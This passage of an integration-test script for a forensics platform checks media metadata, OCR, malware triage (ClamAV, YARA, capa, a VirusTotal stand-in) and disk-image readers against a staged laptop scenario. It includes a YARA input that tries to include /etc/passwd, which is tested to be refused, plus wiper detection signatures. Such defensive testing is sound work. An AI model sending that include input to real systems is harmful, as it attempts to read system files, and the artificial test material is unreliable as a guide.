                pictures[f['path']] = (im.width, im.height)
        except Exception:
            continue
    got = {p: (x['media'].get('width'), x['media'].get('height')) for p, x in items.items() if '!/' not in p and x['media']['kind'] == 'picture'}
    check(f'every picture on the disk that Pillow opens ({len(pictures)}) is in the gallery with its size, renamed holiday.jpg aside (it is the payroll CSV)',
          got == pictures and '/Users/alice/Pictures/holiday.jpg' not in items, (sorted(set(got) ^ set(pictures)), {p: (got.get(p), pictures.get(p)) for p in pictures if got.get(p) != pictures[p]}))
    with Image.open(io.BytesIO(icat_bytes(PHOTO_GPS))) as im:
        exif = im.getexif()
        sub, gps = exif.get_ifd(0x8769), exif.get_ifd(0x8825)
    dms = lambda v, ref: (1 if ref in ('N', 'E') else -1) * (float(v[0]) + float(v[1]) / 60 + float(v[2]) / 3600)
    lat, lon = dms(gps[2], gps[1]), dms(gps[4], gps[3])
    m = items.get(PHOTO_GPS, {}).get('media', {})
    check('the phone photo: camera, the time it records with its offset made UTC (14:10:32), and the GPS position Pillow reads',
          m.get('camera') == f'{exif[0x010F]} {exif[0x0110]}' == 'Google Pixel 8' and m.get('exif', {}).get('DateTimeOriginal') == sub[0x9003]
          and iso(m.get('taken')) == utc(2026, 9, 1, 14, 10, 32) and m.get('taken_basis') == 'offset -04:00 in the picture'
          and abs(m['gps']['lat'] - lat) < 1e-5 and abs(m['gps']['lon'] - lon) < 1e-5 and m['gps']['alt'] == float(gps[6]), m)
    m2 = items.get(PHOTO_LOCAL, {}).get('media', {})
    check("a photo without an offset or GPS: its local time read with the computer's time zone (18:15 EDT = 22:15 UTC)",
          iso(m2.get('taken')) == utc(2026, 8, 30, 22, 15) and m2.get('taken_basis') == "computer's time zone (America/New_York)" and 'gps' not in m2, m2)
    t = get(f"/api/forensics/media/{items[PHOTO_GPS]['_id']}/thumb", inv)
    h = {k.lower(): v for k, v in t.headers.items()}
    with Image.open(io.BytesIO(t.body)) as th:
        size = th.size
    check('the thumbnail is a JPEG DFIP made, 320 pixels across with the photo\'s proportions, served sandboxed and recorded in the audit log',
          t.status == 200 and h.get('content-type') == 'image/jpeg' and size == (320, 240) and h.get('x-content-type-options') == 'nosniff'
          and 'sandbox' in h.get('content-security-policy', '')
          and db.audit_logs.find_one({'action': 'FILE_CONTENT_VIEWED', 'metadata.view': 'thumbnail', 'metadata.path': PHOTO_GPS}), (t.status, size, h))
    local = Path(tempfile.mkdtemp()) / 'clip.mp4'
    local.write_bytes(icat_bytes(VIDEO_MP4))
    fp = json.loads(sh('ffprobe', '-v', 'error', '-print_format', 'json', '-show_format', '-show_streams', str(local)).stdout)
    stream = next(s for s in fp['streams'] if s['codec_type'] == 'video')
    v = items.get(VIDEO_MP4, {}).get('media', {})
    check('the video: length, size and codec as ffprobe gives them, recorded at 14:18:00 UTC, its location',
          v.get('kind') == 'video' and v.get('video', {}).get('duration') == round(float(fp['format']['duration']), 3) == 3.0
          and (v.get('width'), v.get('height'), v['video'].get('video_codec')) == (stream['width'], stream['height'], stream['codec_name']) == (320, 240, 'h264')
          and iso(v.get('taken')) == utc(2026, 9, 1, 14, 18) and v.get('gps', {}).get('lat') == 42.3601 and v['gps'].get('lon') == -71.0589, v)
    frames = v.get('frames') or []
    colours = []
    for i in range(len(frames)):
        with Image.open(io.BytesIO(get(f"/api/forensics/media/{items[VIDEO_MP4]['_id']}/thumb?frame={i}", inv).body)) as fr:
            colours.append(fr.convert('RGB').resize((1, 1)).getpixel((0, 0)))
    check('three keyframes, one per scene (at 0, 1 and 2 seconds); the last one is the red scene',
          [f['method'] for f in frames] == ['scene change'] * 3 and [round(f['time']) for f in frames] == [0, 1, 2]
          and colours[-1][0] > 200 and colours[-1][1] < 60 and colours[-1][2] < 60, (frames, colours))
    places = get(f'/api/forensics/media/locations?case_id={A}&evidence_id={E}', inv).json['data']
    cams = get(f'/api/forensics/media/cameras?case_id={A}', inv).json['data']
    check('locations: the photo and the video; cameras: the Pixel 8 with its two photos',
          sorted(p['path'] for p in places) == sorted([PHOTO_GPS, VIDEO_MP4]) and [(c['camera'], c['items']) for c in cams] == [('Google Pixel 8', 2)], (places, cams))
    q = lambda extra: get(f'/api/forensics/media?case_id={A}&evidence_id={E}&limit=1{extra}', inv).json['total']
    logo = [p for p in items if p.startswith(f'{TB}/INBOX!/')]
    check('filters: 1 video, 2 with a location, 2 by the Pixel 8, the inline email logo from emails, none deleted',
          (q('&kind=video'), q('&gps=true'), q('&camera=Google%20Pixel%208'), q('&source=email'), q('&deleted=true')) == (1, 2, 2, len(logo), 0) and len(logo) == 1,
          (q('&kind=video'), q('&gps=true'), q('&camera=Google%20Pixel%208'), q('&source=email'), q('&deleted=true')))
    ev = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=PICTURE_TAKEN,VIDEO_RECORDED&limit=50', inv).json['data'] if e['evidence_id'] == E]
    check('timeline: the photo taken at 14:10:32 at its position, the video recorded at 14:18',
          any(e['type'] == 'PICTURE_TAKEN' and iso(e['timestamp']) == utc(2026, 9, 1, 14, 10, 32) and '42.36010, -71.05890' in e['description'] for e in ev)
          and any(e['type'] == 'VIDEO_RECORDED' and iso(e['timestamp']) == utc(2026, 9, 1, 14, 18) for e in ev), [e['description'] for e in ev])
    other = items[PHOTO_GPS]['_id']
    check('bad filters are refused (400); another investigator gets 404 for the gallery, an item and its thumbnail',
          get(f'/api/forensics/media?case_id={A}&kind=audio', inv).status == 400 and get(f'/api/forensics/media?case_id={A}&source=cloud', inv).status == 400
          and get(f'/api/forensics/media?case_id={A}', C['INV2']).status == 404 and get(f'/api/forensics/media/{other}', C['INV2']).status == 404
          and get(f'/api/forensics/media/{other}/thumb', C['INV2']).status == 404 and get(f'/api/forensics/media/{other}/thumb?frame=3', inv).status == 404)

    # Text in pictures and scans: the OCR module (full profile), then the content index and found data built on it.
    j = _analyse(inv, E, {'modules': ['ocr']})
    s = j.get('result', {}).get('summary', {})
    check('OCR runs, and the content index and found data are rebuilt with its text', j['status'] == 'COMPLETED'
          and s.get('plan') == ['ocr', 'content', 'found_data'], (j['status'], s.get('plan')))
    ocr = {x['path']: x.get('ocr') for x in db.fs_entries.find({'evidence_id': E, 'ocr': {'$exists': True}}, {'path': 1, 'ocr': 1})}
    wb = ' '.join((ocr.get(WHITEBOARD) or {}).get('text', '').split())
    sc = ' '.join((ocr.get(SCAN_PDF) or {}).get('text', '').split())
    check('OCR reads what is written on the whiteboard and on the scanned page (one page); typed PDFs and tiny pictures are not read',
          'PAYROLL EXPORT' in wb and 'USB' in wb and 'WIPE AFTER UPLOAD' in wb and 'PAYMENT INSTRUCTION' in sc and 'GB33 BUKB 2020 1555 5555 55' in sc
          and ocr[SCAN_PDF]['pages'] == 1 and '/Users/alice/Documents/offer-letter.pdf' not in ocr and not any(p.startswith(f'{TB}/INBOX!/') for p in ocr),
          {p: (o.get('text') or '')[:80] for p, o in ocr.items()})
    listed = {x['path'] for x in get(f'/api/forensics/media?case_id={A}&evidence_id={E}&text=true&limit=100', inv).json['data']}
    check('the "text in pictures" list holds exactly the files OCR read, the scanned PDF included', listed == set(ocr) and SCAN_PDF in listed,
          (sorted(listed), sorted(ocr)))
    cs = get(f'/api/forensics/content-search?case_id={A}&mode=text&q={urllib.parse.quote("wipe after upload")}', inv).json
    check('content search finds the words on the whiteboard photo', [(h['path'], h['method']) for h in cs['files']] == [(WHITEBOARD, 'ocr')], cs['files'])
    iban = next((x for x in get(f'/api/forensics/entities?case_id={A}&kind=iban&limit=50', inv).json['data'] if x.get('value') == 'GB33BUKB20201555555555'), None)
    check('found data: the IBAN on the scanned payment instruction (valid check digits), found through OCR',
          iban and iban.get('first') == SCAN_PDF and iban.get('file_count') == 1, iban)
    full = get(f"/api/forensics/media/{items[WHITEBOARD]['_id']}", inv).json
    check("the whiteboard's details include the text OCR read", 'WIPE AFTER UPLOAD' in (full.get('ocr') or {}).get('text', ''), full.get('ocr'))


# Phase 11: the scenario's programs (scripts/test-image/securedelete) and a VirusTotal stand-in run by this script.
SECUREDELETE_EXE = '/Users/alice/Downloads/SecureDelete.exe'
FAKE_SVCHOST = '/Users/alice/AppData/Local/Temp/svchost.exe'
VT_REQUESTS, VT_KNOWN = [], {}


def _start_vt_mock():
    """A VirusTotal API v3 stand-in on port 18080 (VIRUSTOTAL_BASE_URL in compose.yml): records every request; knows the
    hashes in VT_KNOWN and answers 404 for the rest."""
    import http.server
    import threading

    class Handler(http.server.BaseHTTPRequestHandler):
        def _record(self):
            VT_REQUESTS.append({'method': self.command, 'path': self.path, 'key': self.headers.get('x-apikey'),
                                'body': self.headers.get('Content-Length')})

        def do_GET(self):
            self._record()
            m = re.match(r'^/api/v3/files/([0-9a-f]{64})$', self.path)
            stats = VT_KNOWN.get(m.group(1)) if m else None
            body = json.dumps({'data': {'id': m.group(1), 'type': 'file', 'attributes': {'last_analysis_stats': stats}}} if stats
                              else {'error': {'code': 'NotFoundError'}}).encode()
            self.send_response(200 if stats else 404)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            self._record()
            self.send_response(405)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = http.server.ThreadingHTTPServer(('0.0.0.0', 18080), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()


def _objdump_imports(text):
    """{dll: {function}} from objdump -p's import tables."""
    out, dll = {}, None
    for line in text.splitlines():
        m = re.match(r'^\s*DLL Name: (\S+)', line)
        if m:
            dll = m.group(1)
            out[dll] = set()
            continue
        m = re.match(r'^\s+[0-9a-f]{8}\s+<none>\s+[0-9a-f]{4}\s+(\S+)$', line) or re.match(r'^\s+[0-9a-f]+\s+([A-Za-z_][\w@?]*)$', line)
        if dll and m:
            out[dll].add(m.group(1))
        elif not line.strip():
            dll = None if dll and out.get(dll) else dll
    return out


@section('12r Malware checks (programs vs objdump, ExifTool, osslsigncode and UPX; ClamAV and YARA rule sets; capa; VirusTotal vs a stand-in)')
def t_malware():
    inv, admin, A, E = C['INVESTIGATOR'], C['ADMIN'], C['A'], C['E']
    db = mongo()
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the programs, ClamAV and reputation modules ran with the standard analysis',
          all((mods.get(m) or {}).get('status') == 'COMPLETED' for m in ('executables', 'clamav', 'reputation')), {m: mods.get(m) for m in ('executables', 'clamav', 'reputation')})
    progs = {x['path']: x for x in get(f'/api/forensics/executables?case_id={A}&evidence_id={E}&limit=500', inv).json['data']}
    check('the two programs on the disk are analysed (and nothing else is taken for one)', set(progs) == {SECUREDELETE_EXE, FAKE_SVCHOST}, sorted(progs))
    sd = get(f"/api/forensics/executables/{progs[SECUREDELETE_EXE]['artifact_id']}", inv).json
    sv = get(f"/api/forensics/executables/{progs[FAKE_SVCHOST]['artifact_id']}", inv).json
    sd_local, sv_local = _local(SECUREDELETE_EXE), _local(FAKE_SVCHOST)
    od = sh('objdump', '-p', str(sd_local)).stdout.decode()
    when = re.search(r'Time/Date\s+(.+)', od).group(1).strip()
    check('compile time and imports as objdump reads them (13 August 2026 09:30 UTC; every DLL and function)',
          iso(sd['pe']['compiled']) == datetime.strptime(when, '%a %b %d %H:%M:%S %Y').replace(tzinfo=timezone.utc) == utc(2026, 8, 13, 9, 30)
          and {k.lower(): set(v) for k, v in sd['pe']['imports'].items()} == {k.lower(): v for k, v in _objdump_imports(od).items()},
          (when, sd['pe']['compiled'], sorted(sd['pe']['imports'])))
    ex = json.loads(sh('exiftool', '-j', str(sd_local)).stdout)[0]
    vi = sd['pe']['version_info']
    check('version information as ExifTool reads it', (vi.get('OriginalFilename'), vi.get('CompanyName'), vi.get('FileDescription'), vi.get('ProductVersion'))
          == (ex.get('OriginalFileName'), ex.get('CompanyName'), ex.get('FileDescription'), str(ex.get('ProductVersion'))), (vi, {k: ex.get(k) for k in ('OriginalFileName', 'CompanyName')}))
    ossl = sh('osslsigncode', 'verify', '-in', str(sd_local)).stdout.decode()
    subject = re.search(r'Subject:\s*(.+)', ossl).group(1).strip()
    signer = sd['signature']['signers'][0]
    check('signature: present, by "SecureDelete Project" (osslsigncode reads the same signer), self-signed so untrusted; signed 13 August 09:40 UTC',
          sd['signature']['status'] == 'untrusted' and 'self-signed' in (sd['signature']['detail'] or '')
          and sorted(x.strip() for x in signer['signer'].split(',')) == sorted(x for x in subject.strip('/').split('/'))
          and iso(signer['signing_time']) == utc(2026, 8, 13, 9, 40) and signer['more_info'] == 'https://tools.example.org/securedelete',
          (sd['signature'], subject))
    codes = lambda p: {f['code'] for f in p['flags']}
    check('SecureDelete.exe stands out for its wiping imports and untrusted signature (in a user folder)',
          codes(sd) == {'APIS_FILE_WIPING', 'UNTRUSTED_SIGNATURE', 'USER_FOLDER'}
          and set(next(g['functions'] for g in sd['api_groups'] if g['group'] == 'file_wiping')) >= {'DeleteFileW', 'WriteFile', 'MoveFileExW'}, sd['flags'])
    upx = sh('upx', '-t', str(sv_local))
    sections = re.findall(r'^\s*\d+\s+(\S+)\s', sh('objdump', '-h', str(sv_local)).stdout.decode(), re.M)
    check('the svchost.exe in Temp: packed with UPX (upx -t confirms; objdump lists UPX0, UPX1), built as SecureDelete.exe, a system name outside Windows, unsigned',
          upx.returncode == 0 and sections[:2] == ['UPX0', 'UPX1'] and [s['name'] for s in sv['pe']['sections']][:2] == ['UPX0', 'UPX1']
          and codes(sv) == {'PACKED', 'NAME_MISMATCH', 'SYSTEM_NAME', 'USER_FOLDER'} and sv['signature']['status'] == 'unsigned', (sections, sv['flags']))
    caps = {c['name'] for c in (sd.get('capa') or {}).get('capabilities') or []}
    check('capa ran on both: SecureDelete writes, moves and deletes files (what its source does); the packed copy is reported as packed with UPX',
          {'write file on Windows', 'move file', 'delete file'} <= caps and sd['capa']['ran'] == 'automatically'
          and sv['capa']['status'] == 'limited' and 'packed with UPX' in {c['name'] for c in sv['capa']['capabilities']}, (sorted(caps), sv.get('capa')))
    r = post(f"/api/forensics/executables/{sd['artifact_id']}/capa", inv, timeout=900)
    check('capa on request: run again, recorded with who asked, audited; a viewer may not (403), another investigator sees nothing (404)',
          r.status == 200 and r.json['capa']['ran'] == 'on request by Demo Investigator' and db.audit_logs.find_one({'action': 'CAPA_RUN', 'metadata.path': SECUREDELETE_EXE})
          and post(f"/api/forensics/executables/{sd['artifact_id']}/capa", C['VIEWER']).status == 403
          and get(f"/api/forensics/executables/{sd['artifact_id']}", C['INV2']).status == 404 and get(f'/api/forensics/executables?case_id={A}', C['INV2']).status == 404, r)
    fact = (db.analysis_facts.find_one({'evidence_id': E}) or {}).get('clamav') or {}
    check('without a ClamAV database the scan is skipped and says why', fact.get('status', '').startswith('no database')
          and not db.forensic_artifacts.count_documents({'evidence_id': E, 'source': 'CLAMAV'}), fact)

    # ClamAV databases (administrators): a hash list with the EICAR test file, and a body signature for SecureDelete's banner.
    eicar = icat_bytes('/Users/alice/Downloads/eicar.com')
    hdb = f'{hashlib.md5(eicar).hexdigest()}:{len(eicar)}:Eicar-Test-Signature\n'.encode()
    ndb = f'DFIP.Test.SecureDelete:1:*:{b"SDWIPE/3-PASS".hex()}\n'.encode()
    up = lambda token, name, data: form('POST', '/api/malware/clamav', token, {}, name, data)
    check('only an administrator adds databases (403); a broken database or a wrong file type is refused (400)',
          up(inv, 'dfip.hdb', hdb).status == 403 and up(admin, 'broken.ndb', b'not a signature\n').status == 400
          and up(admin, 'notes.txt', hdb).status == 400)
    a1, a2 = up(admin, 'dfip.hdb', hdb), up(admin, 'dfip.ndb', ndb)
    _wait_jobs(admin, a1.json['rescan_jobs'] + a2.json['rescan_jobs'])
    _analyse(inv, E, {'modules': ['clamav']})  # settle: the last rescan sees both files
    hits = {(x['original_path'], x['rule']) for x in db.forensic_artifacts.find({'evidence_id': E, 'source': 'CLAMAV'})}
    tmp = Path(tempfile.mkdtemp())
    (tmp / 'dfip.hdb').write_bytes(hdb)
    (tmp / 'dfip.ndb').write_bytes(ndb)
    truth = set()
    for path, local in ((SECUREDELETE_EXE, sd_local), (FAKE_SVCHOST, sv_local), ('/Users/alice/Downloads/eicar.com', _local('/Users/alice/Downloads/eicar.com'))):
        out = sh('clamscan', '--no-summary', f'--database={tmp}', str(local)).stdout.decode()
        truth |= {(path, m) for m in re.findall(r': (\S+) FOUND', out)}
    check('ClamAV finds EICAR and SecureDelete, the packed copy too (ClamAV unpacks UPX): what clamscan run directly finds',
          hits == truth == {('/Users/alice/Downloads/eicar.com', 'Eicar-Test-Signature.UNOFFICIAL'), (SECUREDELETE_EXE, 'DFIP.Test.SecureDelete.UNOFFICIAL'),
                            (FAKE_SVCHOST, 'DFIP.Test.SecureDelete.UNOFFICIAL')}, (hits, truth))
    listed = {d['name']: d for d in get('/api/malware/clamav', inv).json['data']}
    check('databases are listed to everyone with their signature counts; additions are audited',
          (listed.get('dfip.hdb') or {}).get('signatures') == 1 and (listed.get('dfip.ndb') or {}).get('signatures') == 1
          and db.audit_logs.count_documents({'action': 'CLAMAV_DATABASE_ADDED'}) >= 2, listed)

    # YARA rule sets (administrators).
    rules = b'rule DFIP_Test_Wiper { strings: $banner = "SDWIPE/3-PASS" condition: $banner }\n'
    yup = lambda token, data, name='Test wiper rules': form('POST', '/api/malware/yara', token, {'name': name}, 'wiper.yar', data)
    check('YARA rule sets: only administrators (403); rules that do not compile or that include files are refused (400)',
          yup(inv, rules).status == 403 and yup(admin, b'rule broken { condition: }').status == 400
          and yup(admin, b'include "/etc/passwd"\nrule x { condition: true }').status == 400)
    y = yup(admin, rules)
    _wait_jobs(admin, y.json.get('rescan_jobs', []))
    yhits = {(x['original_path'], x['rule'], x.get('ruleset')) for x in db.forensic_artifacts.find({'evidence_id': E, 'type': 'MALWARE_INDICATOR', 'source': 'YARA'})}
    check('the added set finds SecureDelete.exe; the packed copy\'s strings are compressed, so YARA (unlike ClamAV) misses it',
          y.status == 200 and y.json['rule_count'] == 1 and (SECUREDELETE_EXE, 'DFIP_Test_Wiper', 'Test wiper rules') in yhits
          and not any(p == FAKE_SVCHOST for p, _, _ in yhits), yhits)
    off = req('PATCH', f"/api/malware/yara/{y.json['set_id']}", admin, {'enabled': False})
    _wait_jobs(admin, off.json.get('rescan_jobs', []))
    gone = not db.forensic_artifacts.find_one({'evidence_id': E, 'rule': 'DFIP_Test_Wiper'})
    d = req('DELETE', f"/api/malware/yara/{y.json['set_id']}", admin)
    _wait_jobs(admin, d.json.get('rescan_jobs', []))
    check('a disabled set no longer matches; deleting it is audited', gone and d.status == 200
          and {a['action'] for a in db.audit_logs.find({'resource_id': y.json['set_id']})} >= {'YARA_RULESET_ADDED', 'YARA_RULESET_DISABLED', 'YARA_RULESET_DELETED'})

    # VirusTotal: nothing is sent until the case turns lookups on; then only hashes.
    check('no VirusTotal request was made while automatic lookups were off (the default)', not VT_REQUESTS, VT_REQUESTS[:3])
    VT_KNOWN[sd['sha256']] = {'malicious': 3, 'suspicious': 1, 'harmless': 0, 'undetected': 66}
    path = f'/api/cases/{A}/threat-intel'
    check('a viewer cannot turn lookups on (403), another investigator sees no case (404)',
          req('PUT', path, C['VIEWER'], {'auto_lookup': True}).status == 403 and req('PUT', path, C['INV2'], {'auto_lookup': True}).status == 404)
    on = req('PUT', path, inv, {'auto_lookup': True})
    _wait_jobs(inv, on.json['jobs'])
    after = {x['path']: x.get('vt') or {} for x in db.forensic_artifacts.find({'evidence_id': E, 'type': 'EXECUTABLE'})}
    hashes = {p['sha256'] for p in progs.values()}
    check('turned on: each program\'s SHA-256 looked up once, nothing else sent (GET /files/<hash> with the key, no body)',
          on.status == 200 and on.json['key_configured'] is True and sorted(r_['path'] for r_ in VT_REQUESTS) == sorted(f'/api/v3/files/{h}' for h in hashes)
          and all(r_['method'] == 'GET' and r_['key'] == 'test-vt-key' and not r_['body'] for r_ in VT_REQUESTS), VT_REQUESTS)
    check('VirusTotal\'s answer is kept with the program: 3 engines for SecureDelete.exe, not known for the packed copy',
          (after[SECUREDELETE_EXE].get('status'), after[SECUREDELETE_EXE].get('malicious')) == ('COMPLETED', 3)
          and after[FAKE_SVCHOST].get('status') == 'NOT_FOUND' and db.audit_logs.find_one({'action': 'THREAT_INTEL_AUTO_LOOKUP_SET', 'metadata.case_id': A}), after)
    n = len(VT_REQUESTS)
    _analyse(inv, E, {'modules': ['reputation']})
    check('looking up again uses the cached answers (no new request)', len(VT_REQUESTS) == n, VT_REQUESTS[n:])
    req('PUT', path, inv, {'auto_lookup': False})
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'PROGRAM', 'item_id': sv['_id'], 'label': 'NOTABLE'}).json
    check('a program can be tagged', 'Packed (UPX)' in ((t.get('snapshot') or {}).get('detail') or ''), t)
    req('DELETE', f"/api/tags/{t.get('tag_id')}", inv)


# Phase 12: disk image formats, image sets, encrypted volumes and shadow copies.
def upload_set(token, case_id, files: list[tuple[str, bytes]]):
    """One upload of several files (a segmented or split image, or a virtual disk with its parents)."""
    b = uuid.uuid4().hex
    parts = [f'--{b}\r\nContent-Disposition: form-data; name="case_id"\r\n\r\n{case_id}\r\n'.encode()]
    for name, data in files:
        parts += [f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{name}"\r\n'
                  f'Content-Type: application/octet-stream\r\n\r\n'.encode(), data, b'\r\n']
    parts.append(f'--{b}--\r\n'.encode())
    return req('POST', '/api/evidence/upload', token, raw=b''.join(parts), ctype=f'multipart/form-data; boundary={b}')


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _working_copy(db, eid):
    return (db.evidence.find_one({'evidence_id': eid}) or {}).get('working_copy') or {}


def _indexed(db, eid):
    return sorted((x['path'], x['inode'], x['deleted']) for x in db.fs_entries.find({'evidence_id': eid, 'pipeline_module': 'fs_index'},
                                                                                     {'path': 1, 'inode': 1, 'deleted': 1}))


def _vhd_merge(child: bytes, parent_media: bytes) -> bytes:
    """A dynamic or differencing VHD read independently of libvhdi (Microsoft's VHD specification): the footer's
    current size and dynamic-header offset, the block allocation table, and each block's sector bitmap (a set bit:
    the sector is in this file; clear: it comes from the parent)."""
    footer = child[-512:]
    assert footer[:8] == b'conectix'
    size = int.from_bytes(footer[48:56], 'big')
    dyn = int.from_bytes(footer[16:24], 'big')
    assert child[dyn:dyn + 8] == b'cxsparse'
    table, entries, block = (int.from_bytes(child[dyn + a:dyn + b], 'big') for a, b in ((16, 24), (28, 32), (32, 36)))
    bitmap = ((block // 512 // 8) + 511) // 512 * 512
    out = bytearray(parent_media[:size].ljust(size, b'\0'))
    for i in range(entries):
        sec = int.from_bytes(child[table + 4 * i:table + 4 * i + 4], 'big')
        if sec == 0xFFFFFFFF:
            continue
        base = sec * 512
        for s in range(block // 512):
            if child[base + s // 8] & (0x80 >> (s % 8)) and i * block + s * 512 < size:
                at = base + bitmap + s * 512
                out[i * block + s * 512:i * block + s * 512 + 512] = child[at:at + 512]
    return bytes(out)


def _luks1_decrypt(data: bytes, password: bytes) -> bytes:
    """LUKS1 opened independently of libluksde (the LUKS1 on-disk format specification): PBKDF2 on each active key
    slot, its key material decrypted and merged (anti-forensic split), the master key checked against the header's
    digest, then the payload decrypted sector by sector."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    assert data[:6] == b'LUKS\xba\xbe'
    cipher, mode, hspec = (data[o:o + 32].rstrip(b'\0').decode() for o in (8, 40, 72))
    payload, key_bytes = struct.unpack('>II', data[104:112])
    mk_digest, mk_salt, mk_iter = data[112:132], data[132:164], struct.unpack('>I', data[164:168])[0]
    assert (cipher, mode) == ('aes', 'cbc-plain'), (cipher, mode)

    def decrypt(key, blob):
        out = bytearray()
        for i in range(0, len(blob), 512):
            iv = ((i // 512) & 0xFFFFFFFF).to_bytes(4, 'little') + bytes(12)
            d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
            out += d.update(blob[i:i + 512]) + d.finalize()
        return bytes(out)

    def diffuse(buf):
        n = hashlib.new(hspec).digest_size
        return b''.join(hashlib.new(hspec, (j // n).to_bytes(4, 'big') + buf[j:j + n]).digest()[:len(buf[j:j + n])]
                        for j in range(0, len(buf), n))

    xor = lambda a, b: bytes(x ^ y for x, y in zip(a, b))
    for k in range(8):
        o = 208 + 48 * k
        active, iters = struct.unpack('>II', data[o:o + 8])
        salt, (km_off, stripes) = data[o + 8:o + 40], struct.unpack('>II', data[o + 40:o + 48])
        if active != 0x00AC71F3:
            continue
        n = key_bytes * stripes
        km = decrypt(hashlib.pbkdf2_hmac(hspec, password, salt, iters, key_bytes),
                     data[km_off * 512:km_off * 512 + (n + 511) // 512 * 512])[:n]
        d = bytes(key_bytes)
        for s in range(stripes - 1):
            d = diffuse(xor(d, km[s * key_bytes:(s + 1) * key_bytes]))
        mk = xor(d, km[(stripes - 1) * key_bytes:])
        if hashlib.pbkdf2_hmac(hspec, mk, mk_salt, mk_iter, 20) == mk_digest:
            return decrypt(mk, data[payload * 512:])
    raise ValueError('no key slot opens with this password')


@section('12s Disk images: virtual disks, split and segmented images (vs qemu-img, the parts themselves and an independent VHD reader)')
def t_disk_formats():
    inv = C['INVESTIGATOR']
    db = mongo()
    case = C['FORMATS_CASE'] = post('/api/cases', inv, {'name': 'Disk image formats', 'priority': 'LOW'}).json['case_id']
    raw = IMG.read_bytes()
    raw_files = _indexed(db, C['E'])
    work = Path(tempfile.mkdtemp())

    # The scenario disk converted with qemu-img to each virtual disk format: each must read back as the same disk.
    for fmt, qemu, opts in (('VHDX', 'vhdx', []), ('VHD', 'vpc', ['-o', 'subformat=dynamic,force_size=on']), ('VMDK', 'vmdk', []),
                            ('QCOW2', 'qcow2', [])):
        out = work / f'laptop.{fmt.lower()}'
        sh('qemu-img', 'convert', '-f', 'raw', '-O', qemu, *opts, str(IMG), str(out))
        back = work / f'{fmt}.raw'
        sh('qemu-img', 'convert', '-f', qemu, '-O', 'raw', str(out), str(back))
        data = out.read_bytes()
        r = upload(inv, case, data, out.name)
        ok = r.status == 200 and r.json['format'] == fmt and r.json['sha256'] == _sha(data)
        j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if ok else {}
        wc = _working_copy(db, r.json['evidence_id']) if ok else {}
        check(f'{fmt} of the scenario disk (qemu-img): read back as the same disk (qemu-img agrees), working copy recorded, '
              'the same files indexed', ok and j.get('status') == 'COMPLETED' and wc.get('sha256') == C['IMG_SHA256'] == _sha(back.read_bytes())
              and wc.get('method', '').startswith('lib') and _indexed(db, r.json['evidence_id']) == raw_files,
              (r, j.get('status'), j.get('error'), wc))
        back.unlink()

    # Real virtual disks (dfVFS samples, made by Hyper-V, VMware, VirtualBox and qemu): the media matches qemu-img's.
    for name, qemu in (('ntfs-fixed.vhd', 'vpc'), ('ntfs-dynamic.vhdx', 'vhdx'), ('ext2.vhd', 'vpc'), ('ext2.vhdx', 'vhdx'),
                       ('ext2.vmdk', 'vmdk'), ('ext2.qcow2', 'qcow2')):
        p = sample('dfvfs', name)
        if not p:
            note(name, 'dfVFS sample not downloaded; skipped')
            continue
        back = work / f'{name}.raw'
        sh('qemu-img', 'convert', '-f', qemu, '-O', 'raw', str(p), str(back))
        r = upload(inv, case, p.read_bytes(), name)
        j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if r.status == 200 else {}
        files = [x for x in _indexed(db, r.json['evidence_id'])] if r.status == 200 else []
        check(f'{name}: the disk read with libyal is byte for byte what qemu-img reads, and its files are indexed',
              j.get('status') == 'COMPLETED' and _working_copy(db, r.json['evidence_id']).get('sha256') == _sha(back.read_bytes())
              and len(files) > 5, (r, j.get('status'), j.get('error'), len(files)))

    # A differencing VHD: refused without its parent; with it, read like the independent reader merges them.
    child, parent = sample('dfvfs', 'ntfs-differential.vhd'), sample('dfvfs', 'ntfs-parent.vhd')
    if child and parent:
        before = db.evidence.count_documents({'case_id': case})
        alone = upload(inv, case, child.read_bytes(), child.name)
        check('a differencing VHD alone is refused (400), naming its parent, and nothing is registered',
              alone.status == 400 and 'ntfs-parent.vhd' in alone.detail and db.evidence.count_documents({'case_id': case}) == before, alone)
        r = upload_set(inv, case, [(child.name, child.read_bytes()), (parent.name, parent.read_bytes())])
        ok = r.status == 200 and r.json['image_set']['kind'] == 'chain' and [(f['name'], f['role']) for f in r.json['image_files']] == [
            ('ntfs-differential.vhd', 'disk'), ('ntfs-parent.vhd', 'parent')]
        j = _analyse(inv, r.json['evidence_id'], {'profile': 'quick'}) if ok else {}
        merged = _vhd_merge(child.read_bytes(), parent.read_bytes()[:-512])
        paths = {x[0] for x in _indexed(db, r.json['evidence_id'])} if ok else set()
        parent_only = upload(inv, case, parent.read_bytes(), parent.name)
        jp = _analyse(inv, parent_only.json['evidence_id'], {'profile': 'quick'})
        check('with its parent: one evidence item of two files, read exactly as an independent VHD reader merges them, '
              'showing the folder and files the child added to its parent',
              j.get('status') == 'COMPLETED' and _working_copy(db, r.json['evidence_id']).get('sha256') == _sha(merged)
              and r.json['sha256'] == _sha(child.read_bytes() + parent.read_bytes())
              and {'/a_directory/a_file', '/passwords.txt'} <= paths and not {'/a_directory/a_file'} & {x[0] for x in _indexed(db, parent_only.json['evidence_id'])},
              (r, j.get('status'), j.get('error'), sorted(paths)[:10]))

    # A raw image split into parts.
    size = 24 << 20
    parts = [(f'laptop.dd.{i + 1:03d}', raw[o:o + size]) for i, o in enumerate(range(0, len(raw), size))]
    before = db.evidence.count_documents({'case_id': case})
    gap = upload_set(inv, case, [parts[0], parts[2]])
    check('a split image with a part missing is refused (400), naming the part, and nothing is registered',
          gap.status == 400 and '.002' in gap.detail and db.evidence.count_documents({'case_id': case}) == before, gap)
    r = upload_set(inv, case, list(reversed(parts)))
    ok = r.status == 200 and r.json['image_set'] == {'kind': 'split', 'count': 3, 'label': 'Raw (dd)'}
